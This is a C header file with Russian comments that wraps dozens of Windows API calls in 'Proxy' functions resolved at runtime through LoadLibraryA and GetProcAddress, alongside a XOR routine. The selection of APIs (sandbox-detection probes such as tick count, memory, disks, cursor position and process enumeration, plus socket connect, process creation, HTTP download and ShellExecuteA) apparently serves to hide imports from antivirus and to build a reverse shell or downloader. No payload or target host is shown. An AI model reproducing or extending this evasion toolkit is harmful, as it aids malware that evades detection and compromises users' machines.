#ifndef FUNCK_H
#define FUNCK_H

#include <windows.h>
#include <stdio.h>
#include <iphlpapi.h>
#include <netioapi.h>
#include <Iphlpapi.h>
#include <ws2tcpip.h>
#include <string.h>
#include <psapi.h>
#include <setupapi.h>
#include <tchar.h>
#include <cfgmgr32.h>
#include <wininet.h>

#include "encrypt_char.c"


void Xor_Encrypt(char* data, size_t len, const char* key) {         // Данную функцию вставляем в проект
    size_t key_len = strlen(key);                   // Вычисляем длину ключа
    for (size_t i = 0; i < len; ++i) {              // Применяем xor к каждому байту байту данных
        data[i] ^= key[i % key_len];
    }
}


void ProxyGetSystemInfo(LPSYSTEM_INFO lpSystemInfo) {

    typedef void(WINAPI* pGetSystemInfo)(LPSYSTEM_INFO);        // Создаем тип pGetSystemInfo, который представляет указатель на функцию, 
                                                                // принимающую указатель на SYSTEM_INFO, и не возвращающую значение
                                                                // это позволит динмамически загружать функцию GetSystemInfo
                                                                // Указываем что возвращает и что принимает
    char funcName_utka[] = "GetSystemInfo";
    char name_dll_utka[] = "kernel32.dll";

    HMODULE hKernel32 = LoadLibraryA(name_dll_utka);                 // Загружаем дескриптор библиотеки kernel32.dll, которая содержит GetSystemInfo
    pGetSystemInfo GetSystemInfoFunc = (pGetSystemInfo)GetProcAddress(hKernel32, funcName_utka); // Получаем адрес функции GetSystemInfo в этой библиотеке

    if (GetSystemInfoFunc != NULL) {                            // Если функция загружена, вызываем ее
        GetSystemInfoFunc(lpSystemInfo);                        // Вызов функции GetSystemInfo
    } else {
        // printf("Error: GetSystemInfo function not found!\n");
        exit(1);
    }
    FreeLibrary(hKernel32);
}


void ProxySleep(int second_sleep) {
    typedef void(WINAPI* pSleep)(int);
    
    char funcName_utka[] = "Sleep";
    char name_dll_utka[] = "kernel32.dll";
    
    HMODULE hKernel32 = LoadLibraryA(name_dll_utka);
    pSleep SleepFunc = (pSleep)GetProcAddress(hKernel32, funcName_utka);
    if (SleepFunc != NULL) {
        SleepFunc(second_sleep);
    } else {
        // printf("Error: Sleep function not found!\n");
        exit(1);
    }
    FreeLibrary(hKernel32);
}


ULONGLONG ProxyGetTickCount64(void) {
    typedef ULONGLONG(WINAPI* pProxyGetTickCount64)(void);

    char funcName_utka[] = "GetTickCount64";
    char name_dll_utka[] = "kernel32.dll";
        
    HMODULE hKernel32 = LoadLibraryA(name_dll_utka);
    pProxyGetTickCount64 ProxyGetTickCount64Func = (pProxyGetTickCount64)GetProcAddress(hKernel32, funcName_utka);
    if (ProxyGetTickCount64Func != NULL) {
        return ProxyGetTickCount64Func();
    } else {
        // printf("Error: GetTickCount64 function not found!\n");
        exit(1);
    }
    FreeLibrary(hKernel32);
}


WINBOOL ProxyGlobalMemoryStatusEx(LPMEMORYSTATUSEX lpBuffer) {
    typedef WINBOOL(WINAPI* pGlobalMemoryStatusEx)(LPMEMORYSTATUSEX);
    
    char funcName_utka[] = "GlobalMemoryStatusEx";
    char name_dll_utka[] = "kernel32.dll";
        
    HMODULE hKernel32 = LoadLibraryA(name_dll_utka);
    pGlobalMemoryStatusEx GlobalMemoryStatusExFunc = (pGlobalMemoryStatusEx)GetProcAddress(hKernel32, funcName_utka);
    if (GlobalMemoryStatusExFunc != NULL) {           
        GlobalMemoryStatusExFunc(lpBuffer);            
    } else {
        // printf("Error: GlobalMemoryStatusEx function not found!\n");
        exit(1);
    }
    FreeLibrary(hKernel32);
}


DWORD ProxyGetAdaptersInfo(PIP_ADAPTER_INFO pAdapterInfo, PULONG dwSize) {
    typedef ULONG(WINAPI* pGetAdaptersInfo)(PIP_ADAPTER_INFO, PULONG);
    
    char funcName_utka[] = "GetAdaptersInfo";
    char name_dll_utka[] = "iphlpapi.dll";
    
    HMODULE hIphlpApi = LoadLibraryA(name_dll_utka);
    pGetAdaptersInfo GetAdaptersInfoFunc = (pGetAdaptersInfo)GetProcAddress(hIphlpApi, funcName_utka);
    if (GetAdaptersInfoFunc != NULL) {
        return GetAdaptersInfoFunc(pAdapterInfo, dwSize);
    } else {
        // printf("Error: GetAdaptersInfo function not found!\n");
        exit(1);
    }
    FreeLibrary(hIphlpApi);
}


BOOL ProxyEnumProcesses(DWORD* lpidProcess, DWORD cb, DWORD* lpcbNeeded) {
    typedef BOOL(WINAPI* pEnumProcesses)(DWORD*, DWORD, DWORD*);
    
    char funcName_utka[] = "EnumProcesses";
    char name_dll_utka[] = "psapi.dll";
    
    HMODULE hPsApi = LoadLibraryA(name_dll_utka);
    pEnumProcesses EnumProcessesFunc = (pEnumProcesses)GetProcAddress(hPsApi, funcName_utka);
    if (EnumProcessesFunc != NULL) {
        EnumProcessesFunc(lpidProcess, cb, lpcbNeeded);
    } else {
        // printf("Error: EnumProcesses function not found!\n");
        exit(1);
    }
    FreeLibrary(hPsApi);
}


HANDLE ProxyOpenProcess(DWORD dwDesiredAccess, WINBOOL bInheritHandle, DWORD dwProcessId) {
    typedef HANDLE(WINAPI* pOpenProcess)(DWORD, WINBOOL, DWORD);
    
    char funcName_utka[] = "OpenProcess";
    char name_dll_utka[] = "kernel32.dll";
    
    HMODULE hKernel32 = LoadLibraryA(name_dll_utka);
    pOpenProcess OpenProcessFunc = (pOpenProcess)GetProcAddress(hKernel32, funcName_utka);
    if (OpenProcessFunc != NULL) {
        HANDLE hProcess = OpenProcessFunc(dwDesiredAccess, bInheritHandle, dwProcessId);
        return hProcess;
    } else {
        // printf("Error: OpenProcess function not found!\n");
        exit(1);
    }
    FreeLibrary(hKernel32);
}


BOOL ProxyEnumProcessModules(HANDLE hProcess, HMODULE* lphModule, DWORD cb, LPDWORD lpcbNeeded) {
    typedef HANDLE(WINAPI* pEnumProcessModules)(HANDLE, HMODULE*, DWORD, LPDWORD);
    
    char funcName_utka[] = "EnumProcessModules";
    char name_dll_utka[] = "psapi.dll";
    
    HMODULE hPsApi = LoadLibraryA(name_dll_utka);
    pEnumProcessModules EnumProcessModulesFunc = (pEnumProcessModules)GetProcAddress(hPsApi, funcName_utka);
    if (EnumProcessModulesFunc != NULL) {
        EnumProcessModulesFunc(hProcess, lphModule, cb, lpcbNeeded);
    } else {
        // printf("Error: EnumProcessModules function not found!\n");
        exit(1);
    }
    FreeLibrary(hPsApi);
}


DWORD ProxyGetModuleBaseName(HANDLE hProcess, HMODULE hModule, LPSTR lpBaseName, DWORD nSize) {
    typedef DWORD(WINAPI* pGetModuleBaseName)(HANDLE, HMODULE, LPSTR, DWORD);
    
    char funcName_utka[] = "GetModuleBaseNameA";
    char name_dll_utka[] = "psapi.dll";
    
    HMODULE hPsApi = LoadLibraryA(name_dll_utka);
    pGetModuleBaseName GetModuleBaseNameFunc = (pGetModuleBaseName)GetProcAddress(hPsApi, funcName_utka);
    if (GetModuleBaseNameFunc != NULL) {
        GetModuleBaseNameFunc(hProcess, hModule, lpBaseName, nSize);
    } else {
        // printf("Error: GetModuleBaseNameA function not found!\n");
        exit(1);
    }
    FreeLibrary(hPsApi);
}


BOOL ProxyEnumDisplayDevices(LPCSTR lpDevice, DWORD iDevNum, PDISPLAY_DEVICEA lpDisplayDevice, DWORD dwFlags) {
    typedef BOOL(WINAPI* pEnumDisplayDevices)(LPCSTR, DWORD, PDISPLAY_DEVICEA, DWORD);
    
    char funcName_utka[] = "EnumDisplayDevicesA";
    char name_dll_utka[] = "user32.dll";
    
    HMODULE hUser32 = LoadLibraryA(name_dll_utka);
    pEnumDisplayDevices EnumDisplayDevicesFunc = (pEnumDisplayDevices)GetProcAddress(hUser32, funcName_utka);
    if (EnumDisplayDevicesFunc != NULL) {
        EnumDisplayDevicesFunc(lpDevice, iDevNum, lpDisplayDevice, dwFlags);
    } else {
        // printf("Error: EnumDisplayDevicesA function not found!\n");
        exit(1);
    }
    FreeLibrary(hUser32);
}


HDEVINFO ProxySetupDiGetClassDevs(const GUID *ClassGuid, PCSTR Enumerator, HWND hwndParent, DWORD Flags) {
    typedef HDEVINFO(WINAPI* pSetupDiGetClassDevs)(const GUID *, PCSTR, HWND, DWORD);
    
    char funcName_utka[] = "SetupDiGetClassDevsA";
    char name_dll_utka[] = "setupapi.dll";
    
    HMODULE hSetupApi = LoadLibraryA(name_dll_utka);
    pSetupDiGetClassDevs SetupDiGetClassDevsFunc = (pSetupDiGetClassDevs)GetProcAddress(hSetupApi, funcName_utka);
    if (SetupDiGetClassDevsFunc != NULL) {
        return SetupDiGetClassDevsFunc(ClassGuid, Enumerator, hwndParent, Flags);
    } else {
        // printf("Error: SetupDiGetClassDevsA function not found!\n");
        exit(1);
    }
    FreeLibrary(hSetupApi);
} 


WINBOOL ProxySetupDiEnumDeviceInfo(HDEVINFO DeviceInfoSet, DWORD MemberIndex, PSP_DEVINFO_DATA DeviceInfoData) {
    typedef WINBOOL(WINAPI* pSetupDiEnumDeviceInfo)(HDEVINFO, DWORD, PSP_DEVINFO_DATA);
    
    char funcName_utka[] = "SetupDiEnumDeviceInfo";
    char name_dll_utka[] = "setupapi.dll";
    
    HMODULE hSetupApi = LoadLibraryA(name_dll_utka);
    pSetupDiEnumDeviceInfo SetupDiEnumDeviceInfoFunc = (pSetupDiEnumDeviceInfo)GetProcAddress(hSetupApi, funcName_utka);
    if (SetupDiEnumDeviceInfoFunc != NULL) {
        return SetupDiEnumDeviceInfoFunc(DeviceInfoSet, MemberIndex, DeviceInfoData);
    } else {
        // printf("Error: SetupDiEnumDeviceInfo function not found!\n");
        exit(1);
    }
    FreeLibrary(hSetupApi);
}



BOOL ProxySetupDiGetDeviceInstanceIdA(HDEVINFO DeviceInfoSet, PSP_DEVINFO_DATA DeviceInfoData, PSTR DeviceInstanceId, DWORD DeviceInstanceIdSize, PDWORD RequiredSize) {
    typedef BOOL(WINAPI* pSetupDiGetDeviceInstanceIdA)(HDEVINFO, PSP_DEVINFO_DATA, PSTR, DWORD, PDWORD);
    
    char funcName_utka[] = "SetupDiGetDeviceInstanceIdA";
    char name_dll_utka[] = "setupapi.dll";
    
    HMODULE hSetupApi = LoadLibraryA(name_dll_utka);
    pSetupDiGetDeviceInstanceIdA SetupDiGetDeviceInstanceIdAFunc = (pSetupDiGetDeviceInstanceIdA)GetProcAddress(hSetupApi, funcName_utka);
    if (SetupDiGetDeviceInstanceIdAFunc != NULL) {
        return SetupDiGetDeviceInstanceIdAFunc(DeviceInfoSet, DeviceInfoData, DeviceInstanceId, DeviceInstanceIdSize, RequiredSize);
    } else {
        // printf("Error: SetupDiGetDeviceInstanceIdA function not found!\n");
        exit(1);
    }
    FreeLibrary(hSetupApi);
}


DWORD  ProxyGetLogicalDrives(void) {
    typedef DWORD(WINAPI* pGetLogicalDrives)(void);

    char funcName_utka[] = "GetLogicalDrives";
    char name_dll_utka[] = "kernel32.dll";
    
    HMODULE hKernel32 = LoadLibraryA(name_dll_utka);
    pGetLogicalDrives GetLogicalDrivesFunc = (pGetLogicalDrives)GetProcAddress(hKernel32, funcName_utka);
    if (GetLogicalDrivesFunc != NULL) {
        return GetLogicalDrivesFunc();
    } else {
        // printf("Error: GetLogicalDrives function not found!\n");
        exit(1);
    }
    FreeLibrary(hKernel32);
}


BOOL __stdcall ProxyGetDiskFreeSpaceExA(LPCSTR lpDirectoryName, PULARGE_INTEGER lpFreeBytesAvailableToCaller, PULARGE_INTEGER lpTotalNumberOfBytes, PULARGE_INTEGER lpTotalNumberOfFreeBytes) {
    typedef BOOL (WINAPI* pGetDiskFreeSpaceExA)(LPCSTR, PULARGE_INTEGER, PULARGE_INTEGER, PULARGE_INTEGER);
    
    char funcName_utka[] = "GetDiskFreeSpaceExA";
    char name_dll_utka[] = "kernel32.dll";
    
    HMODULE hKernel32 = LoadLibraryA(name_dll_utka);
    pGetDiskFreeSpaceExA GetDiskFreeSpaceExAFunc = (pGetDiskFreeSpaceExA)GetProcAddress(hKernel32, funcName_utka);
    if (GetDiskFreeSpaceExAFunc != NULL) {
        return GetDiskFreeSpaceExAFunc(lpDirectoryName, lpFreeBytesAvailableToCaller, lpTotalNumberOfBytes, lpTotalNumberOfFreeBytes);
    } else {
        // printf("Error: GetDiskFreeSpaceExA function not found!\n");
        exit(1);
    }
    FreeLibrary(hKernel32);
}


HINTERNET ProxyInternetOpenA(LPCSTR lpszAgent, DWORD dwAccessType, LPCSTR lpszProxy, LPCSTR lpszProxyBypass, DWORD dwFlags) {
    typedef HINTERNET (WINAPI* pInternetOpenA)(LPCSTR, DWORD, LPCSTR, LPCSTR, DWORD);
    
    char funcName_utka[] = "InternetOpenA";
    char name_dll_utka[] = "wininet.dll";
    
    HMODULE hWinInet = LoadLibraryA(name_dll_utka);
    pInternetOpenA InternetOpenAFunc = (pInternetOpenA)GetProcAddress(hWinInet, funcName_utka);
    if (InternetOpenAFunc != NULL) {
        return InternetOpenAFunc(lpszAgent, dwAccessType, lpszProxy, lpszProxyBypass, dwFlags);
    } else {
        // printf("Error: InternetOpenA function not found!\n");
        exit(1);
    }
    FreeLibrary(hWinInet);
}


HINTERNET ProxyInternetConnectA(HINTERNET hInternet, LPCSTR lpszServerName, INTERNET_PORT nServerPort, LPCSTR lpszUserName, LPCSTR lpszPassword, DWORD dwService, DWORD dwFlags, DWORD_PTR dwContext) {
    typedef HINTERNET (WINAPI* pInternetConnectA)(HINTERNET, LPCSTR, INTERNET_PORT, LPCSTR, LPCSTR, DWORD, DWORD, DWORD_PTR);
    
    char funcName_utka[] = "InternetConnectA";
    char name_dll_utka[] = "wininet.dll";
    
    HMODULE hWinInet = LoadLibraryA(name_dll_utka);
    pInternetConnectA InternetConnectAFunc = (pInternetConnectA)GetProcAddress(hWinInet, funcName_utka);
    if (InternetConnectAFunc != NULL) {
        return InternetConnectAFunc(hInternet, lpszServerName, nServerPort, lpszUserName, lpszPassword, dwService, dwFlags, dwContext);
    } else {
        // printf("Error: InternetConnectA function not found!\n");
        exit(1);
    }
    FreeLibrary(hWinInet);
}


HINTERNET ProxyHttpOpenRequestA(HINTERNET hConnect, LPCSTR lpszVerb, LPCSTR lpszObjectName, LPCSTR lpszVersion, LPCSTR lpszReferrer, LPCSTR *lplpszAcceptTypes, DWORD dwFlags, DWORD_PTR dwContext) {
    typedef HINTERNET (WINAPI* pHttpOpenRequestA)(HINTERNET, LPCSTR, LPCSTR, LPCSTR, LPCSTR, LPCSTR*, DWORD, DWORD_PTR);
    
    char funcName_utka[] = "HttpOpenRequestA";
    char name_dll_utka[] = "wininet.dll";
    
    HMODULE hWinInet = LoadLibraryA(name_dll_utka);
    pHttpOpenRequestA HttpOpenRequestAFunc = (pHttpOpenRequestA)GetProcAddress(hWinInet, funcName_utka);
    if (HttpOpenRequestAFunc != NULL) {
        return HttpOpenRequestAFunc(hConnect, lpszVerb, lpszObjectName, lpszVersion, lpszReferrer, lplpszAcceptTypes, dwFlags, dwContext);
    } else {
        // printf("Error: HttpOpenRequestA function not found!\n");
        exit(1);
    }
    FreeLibrary(hWinInet);
}


WINBOOL ProxyHttpSendRequestA(HINTERNET hRequest, LPCSTR lpszHeaders, DWORD dwHeadersLength, LPVOID lpOptional, DWORD dwOptionalLength) {
    typedef WINBOOL (WINAPI* pHttpSendRequestA)(HINTERNET, LPCSTR, DWORD, LPVOID, DWORD);
    
    char funcName_utka[] = "HttpSendRequestA";
    char name_dll_utka[] = "wininet.dll";
    
    HMODULE hWinInet = LoadLibraryA(name_dll_utka);
    pHttpSendRequestA HttpSendRequestAFunc = (pHttpSendRequestA)GetProcAddress(hWinInet, funcName_utka);
    if (HttpSendRequestAFunc != NULL) {
        return HttpSendRequestAFunc(hRequest, lpszHeaders, dwHeadersLength, lpOptional, dwOptionalLength);
    } else {
        // printf("Error: HttpSendRequestA function not found!\n");
        exit(1);
    }
    FreeLibrary(hWinInet);
}


WINBOOL ProxyInternetReadFile(HINTERNET hFile, LPVOID lpBuffer, DWORD dwNumberOfBytesToRead, LPDWORD lpdwNumberOfBytesRead) {
    typedef WINBOOL (WINAPI* pInternetReadFile)(HINTERNET, LPVOID, DWORD, LPDWORD);
    
    char funcName_utka[] = "InternetReadFile";
    char name_dll_utka[] = "wininet.dll";
    
    HMODULE hWinInet = LoadLibraryA(name_dll_utka);
    pInternetReadFile InternetReadFileFunc = (pInternetReadFile)GetProcAddress(hWinInet, funcName_utka);
    if (InternetReadFileFunc != NULL) {
        return InternetReadFileFunc(hFile, lpBuffer, dwNumberOfBytesToRead, lpdwNumberOfBytesRead);
    } else {
        // printf("Error: InternetReadFile function not found!\n");
        exit(1);
    }
    FreeLibrary(hWinInet);
}


WINBOOL ProxyInternetCloseHandle(HINTERNET hInternet) {
    typedef WINBOOL(WINAPI* pInternetCloseHandle)(HINTERNET);
    
    char funcName_utka[] = "InternetCloseHandle";
    char name_dll_utka[] = "wininet.dll";
    
    HMODULE hWinInet = LoadLibraryA(name_dll_utka);
    pInternetCloseHandle InternetCloseHandleFunc = (pInternetCloseHandle)GetProcAddress(hWinInet, funcName_utka);
    if (InternetCloseHandleFunc != NULL) {
        return InternetCloseHandleFunc(hInternet);
    } else {
        // printf("Error: InternetCloseHandle function not found!\n");
        exit(1);
    }
    FreeLibrary(hWinInet);
}


WINBOOL ProxyGetComputerNameA(LPSTR lpBuffer, LPDWORD nSize) {
    typedef WINBOOL(WINAPI* pGetComputerNameA)(LPSTR, LPDWORD);

    char funcName_utka[] = "GetComputerNameA";
    char name_dll_utka[] = "kernel32.dll";
    
    HMODULE hKernel32 = LoadLibraryA(name_dll_utka);
    pGetComputerNameA GetComputerNameAFunc = (pGetComputerNameA)GetProcAddress(hKernel32, funcName_utka);
    if (GetComputerNameAFunc != NULL) {
        return GetComputerNameAFunc(lpBuffer, nSize);
    } else {
        // printf("Error: GetComputerNameA function not found!\n");
        exit(1);
    }
    FreeLibrary(hKernel32);
}


int ProxyWSAStartup(WORD wVersionRequested, LPWSADATA lpWSAData) {
    typedef int(WINAPI* pWSAStartup)(WORD, LPWSADATA);

    char funcName_utka[] = "WSAStartup";
    char name_dll_utka[] = "ws2_32.dll";
    
    HMODULE hWs2_32 = LoadLibraryA(name_dll_utka);
    pWSAStartup WSAStartupFunc = (pWSAStartup)GetProcAddress(hWs2_32, funcName_utka);
    if (WSAStartupFunc != NULL) {
        return WSAStartupFunc(wVersionRequested, lpWSAData);
    } else {
        // printf("Error: WSAStartup function not found!\n");
        exit(1);
    }
    FreeLibrary(hWs2_32);
}


SOCKET ProxyWSASocketA(int af, int type, int protocol, LPWSAPROTOCOL_INFOA lpProtocolInfoA, GROUP g, DWORD dwFlags) {
    typedef SOCKET(WINAPI* pWSASocketA)(int, int, int, LPWSAPROTOCOL_INFOA, GROUP, DWORD);
    
    char funcName_utka[] = "WSASocketA";
    char name_dll_utka[] = "ws2_32.dll";
    
    HMODULE hWs2_32 = LoadLibraryA(name_dll_utka);
    pWSASocketA WSASocketAFunc = (pWSASocketA)GetProcAddress(hWs2_32, funcName_utka);
    if (WSASocketAFunc != NULL) {
        return WSASocketAFunc(af, type, protocol, lpProtocolInfoA, g, dwFlags);
    } else {
        // printf("Error: WSASocketA function not found!\n");
        exit(1);
    }
    FreeLibrary(hWs2_32);
}


struct hostent *Proxy_gethostbyname(const char *name) {
    typedef struct hostent *(WINAPI* p_gethostbyname)(const char *);

    char funcName_utka[] = "gethostbyname";
    char name_dll_utka[] = "ws2_32.dll";
    
    HMODULE hWs2_32 = LoadLibraryA(name_dll_utka);
    p_gethostbyname gethostbynameFunc = (p_gethostbyname)GetProcAddress(hWs2_32, funcName_utka);
    if (gethostbynameFunc != NULL) {
        return gethostbynameFunc(name);
    } else {
        // printf("Error: gethostbyname function not found!\n");
        exit(1);
    }
    FreeLibrary(hWs2_32);
}


char *Proxy_inet_ntoa(struct in_addr in) {
    typedef char *(WINAPI* p_inet_ntoa)();
    
    char funcName_utka[] = "inet_ntoa";
    char name_dll_utka[] = "ws2_32.dll";
    
    HMODULE hWs2_32 = LoadLibraryA(name_dll_utka);
    p_inet_ntoa inet_ntoaFunc = (p_inet_ntoa)GetProcAddress(hWs2_32, funcName_utka);
    if (inet_ntoaFunc != NULL) {
        return inet_ntoaFunc(in);
    } else {
        // printf("Error: inet_ntoa function not found!\n");
        exit(1);
    }
    FreeLibrary(hWs2_32);
}


u_short Proxy_htons(u_short hostshort) {
    typedef u_short (WINAPI* p_htons)(u_short);

    char funcName_utka[] = "htons";
    char name_dll_utka[] = "ws2_32.dll";
    
    HMODULE hWs2_32 = LoadLibraryA(name_dll_utka);
    p_htons htonsFunc = (p_htons)GetProcAddress(hWs2_32, funcName_utka);
    if (htonsFunc != NULL) {
        return htonsFunc(hostshort);
    } else {
        // printf("Error: htons function not found!\n");
        exit(1);
    }
    FreeLibrary(hWs2_32);
}

int Proxy_atoi(const char *_Str) {
    typedef int(WINAPI* p_atoi)(const char *);
    
    char funcName_utka[] = "atoi";
    char name_dll_utka[] = "msvcrt.dll";
    
    HMODULE hMsvcrt = LoadLibraryA(name_dll_utka);
    p_atoi atoiFunc = (p_atoi)GetProcAddress(hMsvcrt, funcName_utka);
    if (atoiFunc != NULL) {
        return atoiFunc(_Str);
    } else {
        // printf("Error: atoi function not found!\n");
        exit(1);
    }
    FreeLibrary(hMsvcrt);
}


unsigned long Proxy_inet_addr(const char *cp) {
    typedef unsigned long(WINAPI* p_inet_addr)(const char *);
    
    char funcName_utka[] = "inet_addr";
    char name_dll_utka[] = "ws2_32.dll";
    
    HMODULE hWs2_32 = LoadLibraryA(name_dll_utka);
    p_inet_addr inet_addrFunc = (p_inet_addr)GetProcAddress(hWs2_32, funcName_utka);
    if (inet_addrFunc != NULL) {
        return inet_addrFunc(cp);
    } else {
        // printf("Error: inet_addr function not found!\n");
        exit(1);
    }
    FreeLibrary(hWs2_32);
}


int Proxy_WSAConnect(SOCKET s, const struct sockaddr *name, int namelen, LPWSABUF lpCallerData, LPWSABUF lpCalleeData, LPQOS lpSQOS, LPQOS lpGQOS) {
    typedef int(WINAPI* pWSAConnect)(SOCKET, const struct sockaddr *, int, LPWSABUF, LPWSABUF, LPQOS, LPQOS);
    
    char funcName_utka[] = "WSAConnect";
    char name_dll_utka[] = "ws2_32.dll";
    
    HMODULE hWs2_32 = LoadLibraryA(name_dll_utka);
    pWSAConnect WSAConnectFunc = (pWSAConnect)GetProcAddress(hWs2_32, funcName_utka);
    if (WSAConnectFunc != NULL) {
        return WSAConnectFunc(s, name, namelen, lpCallerData, lpCalleeData, lpSQOS, lpGQOS);
    } else {
        // printf("Error: WSAConnect function not found!\n");
        exit(1);
    }
    FreeLibrary(hWs2_32);
}


void *Proxy_memset(void *_Dst, int _Val, size_t _Size) {
    typedef void *(WINAPI* p_memset)(void *, int, size_t);

    char funcName_utka[] = "memset";
    char name_dll_utka[] = "msvcrt.dll";
    
    HMODULE hMsvcrt = LoadLibraryA(name_dll_utka);
    p_memset memsetFunc = (p_memset)GetProcAddress(hMsvcrt, funcName_utka);
    if (memsetFunc != NULL) {
        return memsetFunc(_Dst, _Val, _Size);
    } else {
        // printf("Error: memset function not found!\n");
        exit(1);
    }
    FreeLibrary(hMsvcrt);
}


BOOL ProxyCreateProcessA(LPCTSTR lpApplicationName, LPTSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes, LPSECURITY_ATTRIBUTES lpThreadAttributes, BOOL bInheritHandles, DWORD dwCreationFlags, LPVOID lpEnvironment, LPCTSTR lpCurrentDirectory, LPSTARTUPINFO lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation) {
    typedef BOOL(WINAPI* pCreateProcessA)(LPCTSTR, LPTSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCTSTR, LPSTARTUPINFO, LPPROCESS_INFORMATION);
    
    char funcName_utka[] = "CreateProcessA";
    char name_dll_utka[] = "kernel32.dll";
    
    HMODULE hKernel32 = LoadLibraryA(name_dll_utka);
    pCreateProcessA CreateProcessAFunc = (pCreateProcessA)GetProcAddress(hKernel32, funcName_utka);
    if (CreateProcessAFunc != NULL) {
        return CreateProcessAFunc(lpApplicationName, lpCommandLine, lpProcessAttributes, lpThreadAttributes, bInheritHandles, dwCreationFlags, lpEnvironment, lpCurrentDirectory, lpStartupInfo, lpProcessInformation);
    } else {
        // printf("Error: CreateProcessA function not found!\n");
        exit(1);
    }
    FreeLibrary(hKernel32);
}


WINBOOL ProxyGetCursorPos(LPPOINT lpPoint) {
    typedef WINBOOL(WINAPI* pGetCursorPos)(LPPOINT);
    
    char funcName_utka[] = "GetCursorPos";
    char name_dll_utka[] = "user32.dll";
    
    HMODULE hUser32 = LoadLibraryA(name_dll_utka);
    pGetCursorPos GetCursorPosFunc = (pGetCursorPos)GetProcAddress(hUser32, funcName_utka);
    if (GetCursorPosFunc != NULL) {
        return GetCursorPosFunc(lpPoint);
    } else {
        // printf("Error: GetCursorPos function not found!\n");
        exit(1);
    }
    FreeLibrary(hUser32);
}

DWORD ProxyGetModuleFileNameA(HMODULE hModule, LPSTR lpFilename, DWORD nSize) {
    typedef DWORD(WINAPI* pGetModuleFileNameA)(HMODULE, LPSTR, DWORD);

    char funcName_utka[] = "GetModuleFileNameA";
    char name_dll_utka[] = "kernel32.dll";

    HMODULE hKernel32 = LoadLibraryA(name_dll_utka);
    pGetModuleFileNameA GetModuleFileNameAFunc = (pGetModuleFileNameA)GetProcAddress(hKernel32, funcName_utka);
    if (GetModuleFileNameAFunc != NULL) {
        return GetModuleFileNameAFunc(hModule, lpFilename, nSize);
    } else {
        // printf("Error: GetModuleFileNameA function not found!\n");
        exit(1);
    }
    FreeLibrary(hKernel32);
}

DWORD ProxyGetTempPathA(DWORD nBufferLength, LPSTR lpBuffer) {
    typedef DWORD(WINAPI* pGetTempPathA)(DWORD, LPSTR);

    char funcName_utka[] = "GetTempPathA";
    char name_dll_utka[] = "kernel32.dll";

    HMODULE hKernel32 = LoadLibraryA(name_dll_utka);
    pGetTempPathA GetTempPathAFunc = (pGetTempPathA)GetProcAddress(hKernel32, funcName_utka);
    if (GetTempPathAFunc != NULL) {
        return GetTempPathAFunc(nBufferLength, lpBuffer);
    } else {
        // printf("Error: GetTempPathA function not found!\n");
        exit(1);
    }
    FreeLibrary(hKernel32);
}

HINSTANCE ProxyShellExecuteA(HWND hwnd, LPCSTR lpOperation, LPCSTR lpFile, LPCSTR lpParameters, LPCSTR lpDirectory, INT nShowCmd) {
    typedef HINSTANCE(WINAPI* pShellExecute)(HWND, LPCSTR, LPCSTR , LPCSTR, LPCSTR, INT);

    char funcName_utka[] = "ShellExecuteA";
    char name_dll_utka[] = "shell32.dll";

    HMODULE hShell32 = LoadLibraryA(name_dll_utka);
    pShellExecute ShellExecuteAFunc = (pShellExecute)GetProcAddress(hShell32, funcName_utka);
    if (ShellExecuteAFunc != NULL) {
        return ShellExecuteAFunc(hwnd, lpOperation, lpFile, lpParameters, lpDirectory, nShowCmd);
    } else {
        // printf("Error: ShellExecuteA function not found!\n");
        exit(1);
    }
    FreeLibrary(hShell32);
}

#endif
